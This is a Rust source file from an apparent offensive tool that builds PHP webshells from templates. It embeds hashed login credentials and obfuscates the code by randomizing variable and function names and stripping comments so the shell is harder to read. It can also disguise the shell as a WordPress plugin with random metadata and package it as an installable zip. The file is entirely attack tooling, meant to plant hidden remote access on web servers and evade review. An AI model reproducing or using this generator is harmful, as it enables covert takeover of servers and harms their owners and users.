use std::collections::HashMap;
use std::io::Write;
use std::path::{Path, PathBuf};

use anyhow::Context;
use fancy_regex::Regex;
use sha2::{Digest, Sha512};

use crate::cli_arguments::{CliGenerateArguments, CliGenerateObfuscation, CliGeneratePhpTemplate};
use crate::enums::php::{PhpCms, PhpVersion};
use crate::enums::php::TemplateVariant;
use crate::extract_unique_strings::extract_unique_strings;
use crate::generate_random_string::{generate_password, generate_random_string};

#[derive(Debug)]
pub struct Generator<'a> {
	/// The CLI arguments
	args: &'a CliGenerateArguments,
	/// The PHP template arguments
	php_args: &'a CliGeneratePhpTemplate,

	/// The base path of the PHP templates
	base_template_path: PathBuf,
	/// The path of the PHP template (where files are actually stored and loaded from)
	template_path: PathBuf,
	/// The path of the CMS template (where files are actually stored and loaded from)
	cms_path: Option<PathBuf>,

	/// The generated/loaded PHP code
	code: String,
	/// The generated/loaded CSS code
	css: String,
	/// The generated/loaded JS code
	js: String,
}

impl<'a> Generator<'a> {
	/// Create a new PHP webshell generator
	pub fn new(args: &'a CliGenerateArguments, php_args: &'a CliGeneratePhpTemplate) -> Self {
		Self {
			args,
			php_args,
			base_template_path: PathBuf::from("templates/php/"),
			template_path: PathBuf::new(),
			cms_path: None,
			code: String::new(),
			css: String::new(),
			js: String::new(),
		}
	}

	pub fn generate(&mut self) -> anyhow::Result<()> {
		// Define the templates path to load the PHP templates from
		self.make_template_path();
		self.make_cms_path();

		debug!("Base template path: {}", self.base_template_path.display());
		debug!("Template path: {}", self.template_path.display());

		let displayable_cms_path = match self.cms_path.as_ref() {
			None => "CMS path not loaded".to_string(),
			Some(path) => path.display().to_string(),
		};
		debug!("CMS path: {}", displayable_cms_path);
		info!("Generating PHP webshell (version: {}-{})", self.compute_version_path(), self.php_args.variant);

		self.load_code()?;
		self.load_css();
		self.load_js();

		Ok(())
	}

	/// Load the PHP code from the template
	fn load_code(&mut self) -> anyhow::Result<()> {
		let code_path = self.template_path.join("root.php");

		info!("Using template code file: {}", code_path.display());

		if !Path::exists(&code_path) {
			return Err(anyhow::anyhow!("The template code file does not exist: {}", code_path.display()));
		} else {
			self.code = std::fs::read_to_string(&code_path)
				.with_context(|| format!("Could not read the template code file at {}", code_path.display()))?
		}

		Ok(())
	}

	/// Load the CSS code from the template
	fn load_css(&mut self) {
		let css_path = self.template_path.join("compiled.css");

		info!("Using template CSS file: {}", css_path.display());

		if !Path::exists(&css_path) {
			warn!("The template CSS file does not exist: {}. Continuing without CSS.", css_path.display());
		} else {
			let css_result = std::fs::read_to_string(&css_path);

			match css_result {
				Ok(css_content) => {
					self.css = css_content;
				}
				Err(_) => {
					warn!("Could not read the template CSS file: {}. Continuing without CSS.", css_path.display());
				}
			}
		}
	}

	/// Load the JS code from the template
	fn load_js(&mut self) {
		let js_path = self.template_path.join("compiled.js");

		info!("Using template JS file: {}", js_path.display());

		if !Path::exists(&js_path) {
			warn!("The template JS file does not exist: {}. Continuing without JS.", js_path.display());
		} else {
			let js_result = std::fs::read_to_string(&js_path);

			match js_result {
				Ok(js_content) => {
					self.js = js_content;
				}
				Err(_) => {
					warn!("Could not read the template JS file: {}. Continuing without JS.", js_path.display());
				}
			}
		}
	}

	/// Create the CMS path and set it to the generator
	fn make_cms_path(&mut self) {
		self.cms_path = match self.php_args.cms {
			None => None,
			Some(cms) => {
				match cms {
					PhpCms::Wordpress => Some(self.base_template_path.join("wordpress/wp-content/plugins/webshell")),

					// TODO: Implement Joomla and Drupal
					PhpCms::Joomla => unimplemented!(),
					PhpCms::Drupal => unimplemented!(),
				}
			}
		};
	}

	/// Create the template path and set it to the generator
	fn make_template_path(&mut self) {
		self.template_path = self.base_template_path
		                         .join(self.compute_version_path())
		                         .join(self.php_args.variant.to_string());
	}

	/// Compute the version path
	fn compute_version_path(&self) -> &str {
		match self.php_args.template_version {
			PhpVersion::_53 => "5.x",
			PhpVersion::_70 => "7.x",
			PhpVersion::_80 => "8.x",
		}
	}
}

/// Generate a PHP webshell
///
/// # Arguments
/// * `args` - The CLI arguments
/// * `php_args` - The PHP template arguments
///
/// # Returns
///
/// An empty `anyhow::Result` if the webshell was generated successfully, an error otherwise
pub fn generate_php_webshell(args: &CliGenerateArguments, php_args: &CliGeneratePhpTemplate) -> anyhow::Result<()> {
	let base_template_path = PathBuf::from("templates/php/");

	let template_version = match php_args.template_version {
		PhpVersion::_53 => "5.x",
		PhpVersion::_70 => "7.x",
		PhpVersion::_80 => "8.x",
	};

	let template_path = base_template_path.join(template_version)
	                                      .join(php_args.variant.to_string());

	let cms_path = match php_args.cms {
		None => None,
		Some(cms) => {
			match cms {
				PhpCms::Wordpress => Some(base_template_path.join("wordpress/wp-content/plugins/webshell")),

				// TODO: Implement Joomla and Drupal
				PhpCms::Joomla => unimplemented!(),
				PhpCms::Drupal => unimplemented!(),
			}
		}
	};

	debug!("Base template path: {}", base_template_path.display());
	debug!("Template version path: {}", template_path.display());
	debug!("CMS path: {:?}", cms_path);
	info!("Generating PHP webshell for version: {}", template_version);

	let code_path = template_path.join("root.php");
	let css_path = template_path.join("compiled.css");
	let js_path = template_path.join("compiled.js");

	info!("Using template code file: {}", code_path.display());
	let mut code;
	if !Path::exists(&code_path) {
		error!("The template code file does not exist: {}", code_path.display());
		std::process::exit(1);
	} else {
		code = std::fs::read_to_string(&code_path)
			.with_context(|| format!("Could not read the template code file at {}", code_path.display()))?
	}

	info!("Using template CSS file: {}", css_path.display());
	let mut css = String::new();
	if !Path::exists(&css_path) {
		warn!("The template CSS file does not exist: {}. Continuing without CSS.", css_path.display());
	} else {
		let css_result = std::fs::read_to_string(&css_path);

		match css_result {
			Ok(css_content) => {
				css = css_content;
			}
			Err(_) => {
				warn!("Could not read the template CSS file: {}. Continuing without CSS.", css_path.display());
			}
		}
	}

	info!("Using template JS file: {}", js_path.display());
	let mut js = String::new();
	if !Path::exists(&js_path) {
		warn!("The template JS file does not exist: {}. Continuing without JS.", js_path.display());
	} else {
		let js_result = std::fs::read_to_string(&js_path);

		match js_result {
			Ok(js_content) => {
				js = js_content;
			}
			Err(_) => {
				warn!("Could not read the template JS file: {}. Continuing without JS.", js_path.display());
			}
		}
	}


	let mut buffer_username = [0u8; 128];
	let hashed_username = base16ct::lower::encode_str(
		Sha512::digest(
			format!("{}{}", args.security.username.as_ref().unwrap(), args.security.salt.as_ref().unwrap())
		).as_slice(),
		&mut buffer_username,
	).unwrap();
	debug!("Hashed username generated: {}", hashed_username);

	let mut buffer_password = [0u8; 128];
	let hashed_password = base16ct::lower::encode_str(
		Sha512::digest(
			format!("{}{}", args.security.password.as_ref().unwrap(), args.security.salt.as_ref().unwrap())
		).as_slice(),
		&mut buffer_password,
	).unwrap();
	debug!("Hashed password generated: {}", hashed_password);
	info!("Username and password generated correctly");

	let unique_strings = extract_unique_strings(&code, r#"__[0-9a-zA-Z_]+__"#);
	debug!("Template placeholders: {:?}", unique_strings);

	let functions_prefix = generate_random_string(php_args.functions_prefix.as_str()).unwrap();
	debug!("Generated functions prefix: {}", functions_prefix);

	for placeholder in unique_strings.iter() {
		let value = match placeholder.as_str() {
			"__CSS__" => css.replace("\"", "\\\"").replace("'", "\\'"),
			"__JS__" => js.clone(),
			"__PREFIX__" => functions_prefix.clone(),
			"__WP__" => "__WP__".to_string(),
			"__USERNAME__" => hashed_username.to_string(),
			"__PASSWORD__" => hashed_password.to_string(),
			"__SALT__" => args.security.salt.as_ref().unwrap().to_string(),
			name => {
				if name.starts_with("__FEAT_") || name.starts_with("__PARAM_") {
					generate_random_string(r"\w\d{2}")?
				} else {
					generate_password(5)?
				}
			}
		};

		code = code.replace(placeholder, &value);
	}
	debug!("Placeholder replaced");

	let drop_template_development_backdoor = Regex::new(
		r#"//\s*TEMPLATE DEVELOPMENT BACKDOOR - START(\s|.)*?//\s*TEMPLATE DEVELOPMENT BACKDOOR - END"#
	).unwrap();
	code = drop_template_development_backdoor.replace_all(code.as_str(), "").to_string();
	debug!("Template development backdoor dropped");
	info!("Webshell generated successfully");

	if args.obfuscation.minify {
		info!("Minifying the generated code ...");
		code = minify(&code);
	}

	if args.obfuscation.obfuscate {
		info!("Obfuscating the generated code ...");
		code = obfuscate(&code, &args.obfuscation, &functions_prefix);
	}

	match php_args.cms {
		None => {
			let mut output_path = match &args.output {
				Some(output) => PathBuf::from(output),
				None => PathBuf::from("shell.php"),
			};

			// Set the output path to the plugin archive
			if !output_path.ends_with(".php") {
				output_path.set_extension("php");
			}

			std::fs::write(&output_path, code)
				.with_context(|| format!("Could not write the output file: {}", output_path.display()))?;

			info!("Webshell written to {}", output_path.display());
			info!("Username: {}", args.security.username.as_ref().unwrap());
			info!("Password: {}", args.security.password.as_ref().unwrap());
			info!("Enjoy your webshell!");
		}
		Some(cms) => {
			match cms {
				PhpCms::Wordpress => {
					info!("Generating WordPress webshell ...");

					if cms_path.is_none() {
						return Err(anyhow::anyhow!("Inconsistent state, the WordPress template path is not set. WordPress webshell generation failed."));
					}

					let plugin_path = cms_path.unwrap().join("template.php");
					let mut plugin_code = std::fs::read_to_string(plugin_path.clone())
						.with_context(|| format!("Could not read the WordPress plugin code file at {}", &plugin_path.display()))?;

					// Remove the PHP opening tag from the shell code as it is already present in the plugin code
					code = code.trim_start_matches("<?php").to_string();

					// Insert the webshell code into the plugin code
					plugin_code = plugin_code.replace("// __TEMPLATE_INSERTION_POINT__", &code);

					// Strip all comments from the plugin code
					if !args.obfuscation.minify {
						plugin_code = strip_comments(&plugin_code);
					} else {
						plugin_code = minify(&plugin_code);
					}

					if args.obfuscation.obfuscate {
						plugin_code = obfuscate(&plugin_code, &args.obfuscation, &functions_prefix);
					}

					// load the CMS options
					let plugin_info = parse_cms_options(php_args);
					let fallback_info = make_wordpress_fallback_info();

					// Get the plugin name from the plugin information or the fallback information
					let plugin_name = plugin_info.get("__PLUGIN_NAME__").unwrap_or(fallback_info.get("__PLUGIN_NAME__").unwrap());

					// Insert the plugin information into the plugin code
					plugin_code.insert_str(
						5,
						&format!(
							"
/*
 * Plugin Name: {}
 * Description: {}
 * Version: {}
 * Author: {}
 * Requires PHP: {}
 */
 ",
							plugin_name,
							plugin_info.get("__PLUGIN_DESCRIPTION__").unwrap_or(fallback_info.get("__PLUGIN_DESCRIPTION__").unwrap()),
							plugin_info.get("__PLUGIN_VERSION__").unwrap_or(fallback_info.get("__PLUGIN_VERSION__").unwrap()),
							plugin_info.get("__PLUGIN_AUTHOR__").unwrap_or(fallback_info.get("__PLUGIN_AUTHOR__").unwrap()),
							php_args.template_version.to_string()
							        .split("&")
							        .collect::<Vec<&str>>()
							        .get(0)
							        .unwrap()
							        .replace("PHP >=", "")
							        .trim()
						),
					);

					// Replace the missing with the previously defined prefix
					plugin_code = plugin_code.replace("__PREFIX__", functions_prefix.as_str());

					// Write the webshell as a WordPress plugin archive if the plugin mode is enabled or not in standalone mode
					if php_args.plugin || !php_args.standalone {
						info!("Generating WordPress plugin archive ...");

						let mut plugin_archive_path = match &args.output {
							Some(output) => PathBuf::from(output),
							None => PathBuf::from("plugin.zip"),
						};

						// Set the output path to the plugin archive
						if !plugin_archive_path.ends_with(".zip") {
							plugin_archive_path.set_extension("zip");
						}

						// Create the plugin archive
						let mut zip = zip::ZipWriter::new(
							std::fs::File::create(&plugin_archive_path)
								.with_context(|| format!("Could not create the plugin archive file: {}", plugin_archive_path.display()))?
						);

						let options = zip::write::SimpleFileOptions::default()
							.compression_method(zip::CompressionMethod::Deflated)
							.unix_permissions(0o777);

						// Add the plugin code to the archive
						zip.start_file(format!("{plugin_name}/plugin.php"), options)
						   .with_context(|| format!("Could not add the plugin code to the archive: {}", plugin_archive_path.display()))?;
						zip.write_all(plugin_code.as_bytes())
						   .with_context(|| format!("Could not write the plugin code to the archive: {}", plugin_archive_path.display()))?;

						zip.finish()
						   .with_context(|| format!("Could not finish the plugin archive: {}", plugin_archive_path.display()))?;

						info!("WordPress plugin archive generated successfully: {}", plugin_archive_path.display());
					}

					// Write the webshell to the output file if not generating a plugin archive or in standalone mode
					if php_args.standalone || !php_args.plugin {
						let mut output_path = match &args.output {
							Some(output) => PathBuf::from(output),
							None => PathBuf::from("plugin.php"),
						};

						// Set the output path to the plugin archive
						if !output_path.ends_with(".php") {
							output_path.set_extension("php");
						}

						std::fs::write(&output_path, plugin_code)
							.with_context(|| format!("Could not write the output file: {}", output_path.display()))?;

						info!("Webshell written to {}", output_path.display());
					}

					info!("Plugin Name: {}", plugin_name);
					info!("Username: {}", args.security.username.as_ref().unwrap());
					info!("Password: {}", args.security.password.as_ref().unwrap());
					info!("Enjoy your webshell!");
				}
				PhpCms::Joomla => {
					error!("Joomla is not implemented yet. Exiting ...");
					unimplemented!("Joomla is not implemented yet");
				}
				PhpCms::Drupal => {
					error!("Drupal is not implemented yet. Exiting ...");
					unimplemented!("Drupal is not implemented yet");
				}
			}
		}
	}

	Ok(())
}

/// Generate random information for a WordPress plugin
///
/// This function will generate random information for a WordPress plugin to be used as fallback if the CMS options are
/// not provided
///
/// # Returns
///
/// A HashMap containing the WordPress plugin information
fn make_wordpress_fallback_info() -> HashMap<String, String> {
	let mut fallback_info = HashMap::<String, String>::new();

	fallback_info.insert("__PLUGIN_NAME__".to_string(), generate_random_string(r"\w{10}").unwrap());
	fallback_info.insert("__PLUGIN_DESCRIPTION__".to_string(), generate_random_string(r"\w{20}").unwrap());
	fallback_info.insert("__PLUGIN_VERSION__".to_string(), generate_random_string(r"\d\.\d\.\d").unwrap());
	fallback_info.insert("__PLUGIN_AUTHOR__".to_string(), generate_random_string(r"\w{5}").unwrap());

	fallback_info
}

/// Parse the CMS options
///
/// This function will parse the CMS options passed as arguments and return them as a HashMap
///
/// # Arguments
///
/// * `args` - The CLI arguments
///
/// # Returns
///
/// A HashMap containing the CMS options
fn parse_cms_options(args: &CliGeneratePhpTemplate) -> HashMap<String, String> {
	let mut cms_options = HashMap::<String, String>::new();

	for option in args.cms_option.iter() {
		let key_value: Vec<&str> = option.split('=').collect();

		if key_value.len() != 2 {
			warn!("Invalid CMS option: {}, value discarded", option);
			continue;
		}

		cms_options.insert(key_value[0].to_string(), key_value[1].to_string());
	}

	debug!("CMS options parsed: {:?}", cms_options);

	cms_options
}

/// Strip comments from a PHP code
///
/// This function will remove all comments from the code to make it smaller and harder to read
///
/// Whitelisted comments are those that should not be removed, such as URLs and specific comments, the following
/// patterns are whitelisted:
/// - `://` - URLs, example: "https://example.com"
/// - `"//` - Strings concatenation at the beginning of the line, example: "//" . "string"
/// - `(//` - Strings containing domain-like specifications, example: "connected successfully (//domain)"
/// - `\w\s//` - Strings containing domain-like specifications (prefixed with a letter and a space), example: "example //domain"
/// - ` - do not remove - ` - Comments that should not be removed
/// - ` - DO NOT REMOVE - ` - Comments that should not be removed
///
/// # Arguments
///
/// * `file_content` - The content of the PHP file to strip comments from
///
/// # Returns
///
/// The PHP code without comments
fn strip_comments(file_content: &str) -> String {
	// Regex patterns for line comments (// ...) and multiline comments (/* ... */) in PHP
	let comments_patters = Regex::new(
		r#"((?<![:"(]|\w )\/\/(?! - do not remove - | - DO NOT REMOVE - ).*\s*|\/\*(.|\s)*?\*\/\s*)"#
	).unwrap();

	// Remove comments
	comments_patters.replace_all(file_content, "").to_string()
}

/// Minify a PHP code
///
/// This function will remove all comments and unnecessary whitespace from the code, drastically reducing the overall file size
///
/// # Arguments
///
/// * `file_content` - The content of the PHP file to minify
///
/// # Returns
///
/// The minified PHP code
fn minify(file_content: &str) -> String {
	let mut minified_content = strip_comments(file_content);

	// Replace "<?php\s*" with "<?php " to avoid dropping the whitespace after the opening tag
	let php_opening_tag = Regex::new(r#"<\?php\s*"#).unwrap();
	minified_content = php_opening_tag.replace_all(&minified_content, "<?php ").to_string();

	// Remove whitespaces, tabs, newlines, and double spaces
	minified_content = minified_content.replace("\n", "")
	                                   .replace("\r", "")
	                                   .replace("\t", "")
	                                   .replace("  ", "");
	minified_content
}

/// Obfuscate a PHP code
///
/// This function will obfuscate the variable names and function names in the code
///
/// # Arguments
///
/// * `file_content` - The content of the PHP file to obfuscate
/// * `params` - The obfuscation parameters
/// * `prefix` - The prefix to use for the function names
///
/// # Returns
///
/// The obfuscated PHP code
fn obfuscate(file_content: &str, params: &CliGenerateObfuscation, prefix: &String) -> String {
	let mut obfuscated_content = file_content.to_string();

	// Obfuscate variable names (excluding globals)
	let all_var_definitions = extract_unique_strings(&obfuscated_content, r#"\$\w+"#);
	let php_global_excluded_variables = all_var_definitions.iter().filter(|var| !var.starts_with("$_")).collect::<Vec<_>>();
	debug!("Php variable definitions (without globals): {:?}", php_global_excluded_variables);

	for var in php_global_excluded_variables.iter() {
		let casual_name = generate_random_string(format!("${}", params.obfuscation_variable_format.as_str()).as_str()).unwrap();
		obfuscated_content = obfuscated_content.replace(*var, &casual_name);
	}
	info!("Php variable names obfuscated (count: {})", php_global_excluded_variables.len());

	// Obfuscate function names
	let all_func_definitions = extract_unique_strings(&obfuscated_content, r#"function\s+\w+"#);
	debug!("Php function definitions: {:?}", all_func_definitions);

	for func in all_func_definitions.iter() {
		// func = function <name>
		// casual_name = full function definition replacement
		let casual_name = generate_random_string(format!("function {prefix}{}", params.obfuscation_function_format).as_str()).unwrap();

		let func_fragments = func.split_whitespace().collect::<Vec<&str>>();
		let casual_function_name_fragments = casual_name.split_whitespace().collect::<Vec<&str>>();

		// call_user_func_name = '<name>' or "<name>" (isolated function name with quotes, reported in strings and indirect calls)
		let call_user_func_name = func_fragments.get(1).unwrap();
		let call_user_func_apex = format!("'{}'", call_user_func_name);
		let call_user_func_quotes = format!("\"{}\"", call_user_func_name);
		// call_user_func_casual_name = '<casual_name>' or "<casual_name>" replacement for call_user_func_name
		let call_user_func_casual_name = casual_function_name_fragments.get(1).unwrap();
		let call_user_func_casual_name_apex = format!("'{}'", call_user_func_casual_name);
		let call_user_func_casual_name_quotes = format!("\"{}\"", call_user_func_casual_name);

		// direct_function_call_name = <name>( - (reported in direct calls)
		let direct_function_call_name = format!("{}(", call_user_func_name);
		let direct_function_call_casual_name = format!("{}(", call_user_func_casual_name);

		obfuscated_content = obfuscated_content.replace(func, &casual_name)
		                                       .replace(&call_user_func_apex, &call_user_func_casual_name_apex)
		                                       .replace(&call_user_func_quotes, &call_user_func_casual_name_quotes)
		                                       .replace(&direct_function_call_name, &direct_function_call_casual_name);
	}
	info!("Php function names obfuscated (count: {})", all_func_definitions.len());

	obfuscated_content
}